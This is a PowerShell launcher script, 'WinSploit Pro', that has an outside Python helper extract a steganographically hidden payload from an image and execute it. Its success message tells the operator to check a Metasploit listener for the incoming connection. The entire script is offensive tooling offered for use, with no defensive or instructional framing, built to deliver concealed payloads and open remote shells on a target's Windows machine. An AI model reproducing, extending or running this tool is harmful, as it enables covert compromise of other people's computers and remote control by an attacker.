# WinSploit Pro - PowerShell Payload Extractor
# This script extracts and executes payloads from steganographic images

param(
    [Parameter(Mandatory=$true)]
    [string]$ImagePath,
    
    [Parameter(Mandatory=$false)]
    [string]$Password
)

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "WinSploit Pro - PowerShell Payload Extractor" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# Check if image file exists
if (-not (Test-Path $ImagePath)) {
    Write-Host "[!] Image file not found: $ImagePath" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Check if Python is available
try {
    $pythonVersion = python --version 2>&1
    Write-Host "[+] Python found: $pythonVersion" -ForegroundColor Green
} catch {
    Write-Host "[!] Python not found on this system" -ForegroundColor Red
    Write-Host "[!] Please install Python 3.6+ with PIL and stegano libraries" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Try to extract payload using Python
Write-Host "[*] Extracting payload from: $ImagePath" -ForegroundColor Yellow

if ($Password) {
    Write-Host "[*] Using password for decryption" -ForegroundColor Yellow
    $result = python windows_extractor.py $ImagePath $Password
} else {
    $result = python windows_extractor.py $ImagePath
}

# Check result
if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] SUCCESS: Check your Metasploit listener for connection!" -ForegroundColor Green
} else {
    Write-Host "[!] FAILED: Could not extract or execute payload" -ForegroundColor Red
    Write-Host "[*] Make sure you have the required Python libraries installed:" -ForegroundColor Yellow
    Write-Host "    pip install Pillow stegano cryptography" -ForegroundColor Yellow
}

Read-Host "`nPress Enter to exit"
